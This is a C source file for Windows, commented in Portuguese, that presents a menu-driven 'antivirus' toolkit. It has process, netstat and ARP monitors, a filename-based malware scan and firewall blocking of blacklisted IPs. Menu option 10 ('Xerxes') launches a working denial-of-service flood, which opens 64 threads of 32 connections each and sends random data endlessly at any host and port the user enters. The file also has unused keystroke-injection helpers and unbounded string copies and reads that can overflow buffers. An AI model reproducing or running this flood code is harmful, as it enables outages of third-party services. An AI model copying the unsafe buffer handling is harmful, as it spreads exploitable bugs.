#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0501

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <process.h>
#include <direct.h>
#include <ctype.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define CONNECTIONS 8
#define THREADS 48
#define MAX_THREADS 64
#define CONNECTIONS_PER_THREAD 32
#define BUFFER_SIZE 1024

// Função para pressionar teclas
void pressKey(WORD vk) {
    keybd_event(vk, 0, 0, 0);
    keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
}

// Função para digitar texto
void typeText(const char *text) {
    for (int i = 0; i < strlen(text); i++) {
        WORD vk = VkKeyScan(text[i]);
        if ((vk & 0x0100) != 0) {
            keybd_event(VK_SHIFT, 0, 0, 0);
        }
        pressKey(vk & 0xFF);
        if ((vk & 0x0100) != 0) {
            keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
        }
        Sleep(50);
    }
}

// Função para executar comandos no CMD
void executar_comando(const char *comando) {
    char cmd[256];
    sprintf(cmd, "cmd /c %s", comando);
    system(cmd);
}

// Monitoramento de processos ativos
void monitorar_processos(char *log_resultados) {
    PROCESSENTRY32 processo;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    processo.dwSize = sizeof(PROCESSENTRY32);
    strcat(log_resultados, "Monitoramento de processos ativos:\n");
    if (Process32First(snapshot, &processo)) {
        do {
            strcat(log_resultados, processo.szExeFile);
            strcat(log_resultados, "\n");
        } while (Process32Next(snapshot, &processo));
    } else {
        strcat(log_resultados, "Erro ao acessar os processos ativos.\n");
    }
    CloseHandle(snapshot);
}

// Função para bloquear IPs da blacklist
void bloquear_ips() {
    FILE *file = fopen("blacklist.txt", "r");
    char ip[100];
    if (file) {
        while (fgets(ip, sizeof(ip), file) != NULL) {
            ip[strcspn(ip, "\n")] = 0;
            char command[200];
            sprintf(command, "netsh advfirewall firewall add rule name=\"Dexter Block\" dir=in action=block remoteip=%s", ip);
            system(command);
            printf("Bloqueado: %s\n", ip);
        }
        fclose(file);
        printf("Bloqueio de IPs concluido.\n");
    } else {
        printf("Erro ao abrir blacklist.txt\n");
    }
}

// Função para desbloquear os IPs
void desbloquear_ips() {
    system("netsh advfirewall firewall delete rule name=\"Dexter Block\"");
    printf("Desbloqueio realizado.\n");
}

// Monitoramento de conexões de rede
void monitorar_conexoes(char *log_resultados) {
    FILE *fp = _popen("netstat -ano", "r"); // Use _popen to execute netstat and capture its output
    if (fp) {
        char buffer[512];
        strcat(log_resultados, "Monitoramento de conexoes de rede:\n");
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            strcat(log_resultados, buffer); // Append each line of netstat output to log_resultados
        }
        _pclose(fp); // Close the pipe
    } else {
        strcat(log_resultados, "Erro ao executar netstat.\n");
    }
}

// Função para converter string para minúsculas
void toLowerCase(char *str) {
    for(int i = 0; str[i]; i++){
        str[i] = tolower(str[i]);
    }
}

// Função para extrair o nome do arquivo do caminho completo
void extractFileName(const char *path, char *fileName) {
    const char *lastSlash = strrchr(path, '\\');
    if (lastSlash != NULL) {
        strcpy(fileName, lastSlash + 1);
    } else {
        strcpy(fileName, path);
    }
    toLowerCase(fileName);
}

// Função para verificar se um arquivo está na lista de malwares
int checkMalwareList(const char *fileName, FILE *malwareList) {
    char line[256];
    char lowerFileName[256];
    
    strcpy(lowerFileName, fileName);
    toLowerCase(lowerFileName);
    
    rewind(malwareList);
    while (fgets(line, sizeof(line), malwareList)) {
        // Remove newline if present
        line[strcspn(line, "\n")] = 0;
        toLowerCase(line);
        
        if (strstr(lowerFileName, line) != NULL) {
            return 1; // Arquivo encontrado na lista de malwares
        }
    }
    return 0; // Arquivo não encontrado na lista
}

// Função recursiva para escanear diretórios
void scanDirectory(const char *path, FILE *malwareList, FILE *logFile) {
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH];
    char filePath[MAX_PATH];
    char fileName[256];
    HANDLE hFind;

    // Prepara o caminho de busca
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        // Constrói o caminho completo do arquivo/diretório
        snprintf(filePath, MAX_PATH, "%s\\%s", path, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Se for um diretório, faz a chamada recursiva
            scanDirectory(filePath, malwareList, logFile);
        } else {
            // Se for um arquivo, verifica se está na lista de malwares
            extractFileName(filePath, fileName);
            if (checkMalwareList(fileName, malwareList)) {
                fprintf(logFile, "[ALERTA] Possível malware encontrado: %s\n", filePath);
                printf("[ALERTA] Possível malware encontrado: %s\n", filePath);
            }
        }
    } while (FindNextFile(hFind, &findData));

    FindClose(hFind);
}

// Função aprimorada de verificação de malware
void verificar_malware() {
    char currentPath[MAX_PATH];
    FILE *malwareList, *logFile;
    char buffer[1024];
    int totalFiles = 0;
    int malwareFound = 0;

    printf("Iniciando verificacao aprimorada de malwares...\n");

    // Abre a lista de malwares conhecidos
    malwareList = fopen("malware_list.txt", "r");
    if (!malwareList) {
        printf("Erro: Arquivo malware_list.txt nao encontrado!\n");
        printf("Por favor, crie um arquivo malware_list.txt com nomes de malwares conhecidos.\n");
        return;
    }

    // Cria/abre arquivo de log
    logFile = fopen("scan_results.txt", "w");
    if (!logFile) {
        printf("Erro ao criar arquivo de log!\n");
        fclose(malwareList);
        return;
    }

    // Obtém o diretório atual
    if (_getcwd(currentPath, sizeof(currentPath)) == NULL) {
        printf("Erro ao obter diretorio atual!\n");
        fclose(malwareList);
        fclose(logFile);
        return;
    }

    fprintf(logFile, "=== Scan de Malware Iniciado ===\n");
    fprintf(logFile, "Diretório base: %s\n\n", currentPath);
    
    // Inicia o scan recursivo
    printf("Escaneando arquivos...\n");
    scanDirectory("C:\\", malwareList, logFile);

    fprintf(logFile, "\n=== Scan de Malware Concluído ===\n");
    fclose(logFile);
    fclose(malwareList);

    // Exibe resultados do scan
    printf("\nVerificacao concluida!\n");
    printf("Os resultados foram salvos em 'scan_results.txt'\n");

    // Exibe o conteúdo do arquivo de resultados
    logFile = fopen("scan_results.txt", "r");
    if (logFile) {
        printf("\nConteudo do arquivo de resultados:\n");
        printf("===================================\n");
        while (fgets(buffer, sizeof(buffer), logFile)) {
            printf("%s", buffer);
        }
        fclose(logFile);
    }
}

void monitorar_arp(char *log_resultados) {
    FILE *fp = _popen("arp -a", "r");
    if (fp) {
        char buffer[512];
        strcat(log_resultados, "Verificando tabela ARP:\n");
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            strcat(log_resultados, buffer);
        }
        _pclose(fp);
        strcat(log_resultados, "Verificacao de tabela ARP concluida.\n");
    } else {
        strcat(log_resultados, "Erro ao executar comando arp -a.\n");
    }
}

// Manipulação de listas (Whitelist/Blacklist)
int atualizar_lista(const char *arquivo, const char *entrada) { // Change return type to int
    FILE *file = fopen(arquivo, "a");
    if (file) {
        fprintf(file, "%s\n", entrada);
        fclose(file);
        printf("%s adicionado a lista %s\n", entrada, arquivo);
        return 1; // Success
    } else {
        printf("Erro ao abrir a lista %s\n", arquivo);
        return 0; // Failure
    }
}

// Estrutura para passar parâmetros para as threads
typedef struct {
    const char *host;
    const char *port;
    int thread_id;
} ThreadData;

// Função de ataque aprimorada para cada thread
unsigned __stdcall enhanced_attack_thread(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    SOCKET sockets[CONNECTIONS_PER_THREAD];
    struct addrinfo hints, *servinfo, *p;
    int r;
    char attack_buffer[BUFFER_SIZE];
    
    // Inicializa o buffer de ataque com dados aleatórios
    for (int i = 0; i < BUFFER_SIZE; i++) {
        attack_buffer[i] = rand() % 255 + 1;
    }

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(data->host, data->port, &hints, &servinfo) != 0) {
        printf("Thread %d: getaddrinfo falhou\n", data->thread_id);
        return 1;
    }

    // Inicializa array de sockets
    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
        sockets[i] = INVALID_SOCKET;
    }

    printf("Thread %d: Iniciando ataque...\n", data->thread_id);

    while (1) {
        for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
            if (sockets[i] == INVALID_SOCKET) {
                // Tenta estabelecer nova conexão
                for (p = servinfo; p != NULL; p = p->ai_next) {
                    sockets[i] = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
                    if (sockets[i] == INVALID_SOCKET) {
                        continue;
                    }

                    // Configura socket para não-bloqueante
                    unsigned long mode = 1;
                    ioctlsocket(sockets[i], FIONBIO, &mode);

                    // Tenta conectar
                    connect(sockets[i], p->ai_addr, p->ai_addrlen);
                    break;
                }
            } else {
                // Envia dados em conexões existentes
                int send_result = send(sockets[i], attack_buffer, BUFFER_SIZE, 0);
                if (send_result == SOCKET_ERROR) {
                    closesocket(sockets[i]);
                    sockets[i] = INVALID_SOCKET;
                } else {
                    printf("Thread %d: Pacote enviado pelo socket %d\n", data->thread_id, i);
                }
            }
        }
        Sleep(10); // Pequeno delay para não sobrecarregar o CPU
    }

    // Cleanup
    freeaddrinfo(servinfo);
    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
        }
    }
    return 0;
}

// Função Xerxes aprimorada
void xerxes_attack(const char *host, const char *port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("Falha ao inicializar Winsock.\n");
        return;
    }

    HANDLE threads[MAX_THREADS];
    ThreadData thread_data[MAX_THREADS];

    printf("Iniciando ataque Xerxes aprimorado contra %s:%s\n", host, port);
    printf("Utilizando %d threads com %d conexoes por thread\n", MAX_THREADS, CONNECTIONS_PER_THREAD);

    // Inicia as threads
    for (int i = 0; i < MAX_THREADS; i++) {
        thread_data[i].host = host;
        thread_data[i].port = port;
        thread_data[i].thread_id = i;

        threads[i] = (HANDLE)_beginthreadex(NULL, 0, enhanced_attack_thread, &thread_data[i], 0, NULL);
        if (threads[i] == NULL) {
            printf("Erro ao criar thread %d\n", i);
            continue;
        }
        Sleep(100); // Pequeno delay entre criação de threads
    }

    // Aguarda comando para encerrar
    printf("\nPressione Enter para encerrar o ataque...\n");
    getchar();
    getchar();

    // Encerra as threads
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i] != NULL) {
            TerminateThread(threads[i], 0);
            CloseHandle(threads[i]);
        }
    }

    WSACleanup();
    printf("Ataque encerrado.\n");
}

// Menu principal
void menu() {
    int command;
    char entrada[100];
    char ultima_acao[256] = "Nenhuma acao realizada ainda."; // Armazena a última ação realizada
    char log_resultados[4096] = ""; // Aumentei o tamanho para armazenar mais resultados

    while (1) {
        const char *ascii[] = {
            " * 8 888888888o.      8 8888888888   `8.`8888.      ,8' 8888888 8888888888 8 8888888888   8 888888888o. *",
            " * 8 8888    `^888.   8 8888          `8.`8888.    ,8'        8 8888       8 8888         8 8888    `88. *",
            " * 8 8888        `88. 8 8888           `8.`8888.  ,8'         8 8888       8 8888         8 8888     `88 *",
            " * 8 8888         `88 8 8888            `8.`8888.,8'          8 8888       8 8888         8 8888     ,88 *",
            " * 8 8888          88 8 888888888888     `8.`88888'           8 8888       8 888888888888 8 8888.   ,88' *",
            " * 8 8888          88 8 8888             .88.`8888.           8 8888       8 8888         8 888888888P'  *",
            " * 8 8888         ,88 8 8888            .8'`8.`8888.          8 8888       8 8888         8 8888`8b       ",
            " * 8 8888        ,88' 8 8888           .8'  `8.`8888.         8 8888       8 8888         8 8888 `8b.     ",
            " * 8 8888    ,o88P'   8 8888          .8'    `8.`8888.        8 8888       8 8888         8 8888   `8b.   ",
            " * 8 888888888P'      8 888888888888 .8'      `8.`8888.       8 8888       8 888888888888 8 8888     `88. *"
        };

        const char *menu_linhas[] = {
            "#------------------------------------#",
            "           Antivirus Options:",
            "#------------------------------------#",
            "1  - Executar Neofetch no CMD",
            "2  - Monitorar processos ativos",
            "3  - Monitorar conexoes de rede",
            "4  - Verificar malware",
            "5  - Adicionar a whitelist",
            "6  - Adicionar a blacklist",
            "7  - Bloquear IPs da blacklist",
            "8  - Desbloquear IPs da blacklist",
            "9  - Monitorar tabela ARP (detectar MITM)",
            "10 - Executar Xerxes",
            "11 - Sair"
        };

        int num_linhas_menu = sizeof(menu_linhas) / sizeof(menu_linhas[0]);
        int num_linhas_ascii = sizeof(ascii) / sizeof(ascii[0]);
        int max_linhas = (num_linhas_menu > num_linhas_ascii) ? num_linhas_menu : num_linhas_ascii;

        printf("\n");

        for (int i = 0; i < max_linhas; i++) {
            if (i < num_linhas_menu)
                printf("%-45s", menu_linhas[i]); // menu com alinhamento
            else
                printf("%-45s", ""); // linha vazia se o menu acabar

            if (i < num_linhas_ascii)
                printf("%s", ascii[i]); // imprime arte ao lado
            printf("\n");
        }

        printf("\nUltima acao: %s\n", ultima_acao);
        printf("\nLog de resultados:\n%s\n", log_resultados);
        printf("\nEscolha uma opcao: ");
        scanf("%d", &command);

        switch (command) {
            case 1:
                executar_comando("neofetch");
                strcpy(ultima_acao, "Executado Neofetch no CMD.");
                strcat(log_resultados, "Neofetch executado com sucesso.\n");
                break;
            case 2:
                monitorar_processos(log_resultados);
                strcpy(ultima_acao, "Monitoramento de processos ativos realizado.");
                break;
            case 3:
                monitorar_conexoes(log_resultados);
                strcpy(ultima_acao, "Monitoramento de conexoes de rede realizado.");
                break;
            case 4:
                verificar_malware();
                strcpy(ultima_acao, "Verificacao de malware realizada.");
                strcat(log_resultados, "Verificacao de malware concluida. Verifique o arquivo file_list.txt.\n");
                break;
            case 5:
                printf("Digite o IP para whitelist: ");
                scanf("%s", entrada);
                if (atualizar_lista("whitelist.txt", entrada)) {
                    sprintf(ultima_acao, "IP %s adicionado a whitelist.", entrada);
                    sprintf(log_resultados + strlen(log_resultados), "IP %s adicionado com sucesso a whitelist.\n", entrada);
                } else {
                    sprintf(ultima_acao, "Falha ao adicionar IP %s a whitelist.", entrada);
                    sprintf(log_resultados + strlen(log_resultados), "Erro ao adicionar IP %s a whitelist.\n", entrada);
                }
                break;
            case 6:
                printf("Digite o IP para blacklist: ");
                scanf("%s", entrada);
                if (atualizar_lista("blacklist.txt", entrada)) {
                    sprintf(ultima_acao, "IP %s adicionado a blacklist.", entrada);
                    sprintf(log_resultados + strlen(log_resultados), "IP %s adicionado com sucesso a blacklist.\n", entrada);
                } else {
                    sprintf(ultima_acao, "Falha ao adicionar IP %s a blacklist.", entrada);
                    sprintf(log_resultados + strlen(log_resultados), "Erro ao adicionar IP %s a blacklist.\n", entrada);
                }
                break;
            case 7:
                bloquear_ips();
                strcpy(ultima_acao, "Bloqueio de IPs da blacklist realizado.");
                strcat(log_resultados, "Bloqueio de IPs da blacklist concluido.\n");
                break;
            case 8:
                desbloquear_ips();
                strcpy(ultima_acao, "Desbloqueio de IPs da blacklist realizado.");
                strcat(log_resultados, "Desbloqueio de IPs da blacklist concluido.\n");
                break;
            case 9:
                monitorar_arp(log_resultados);
                strcpy(ultima_acao, "Monitoramento de ARP realizado.");
                break;
            case 10: {
                char host[256];
                char port[6];
                printf("Digite o host alvo: ");
                scanf("%s", host);
                printf("Digite a porta: ");
                scanf("%s", port);
                xerxes_attack(host, port);
                sprintf(ultima_acao, "Xerxes executado contra %s:%s", host, port);
                sprintf(log_resultados + strlen(log_resultados), "Xerxes iniciado contra %s:%s\n", host, port);
                break;
            }
            case 11:
                exit(0);
            default:
                strcpy(ultima_acao, "Opcao invalida selecionada.");
                strcat(log_resultados, "Opcao invalida inserida.\n");
                break;
        }
    }
}

int main() {
    menu();
    return 0;
}

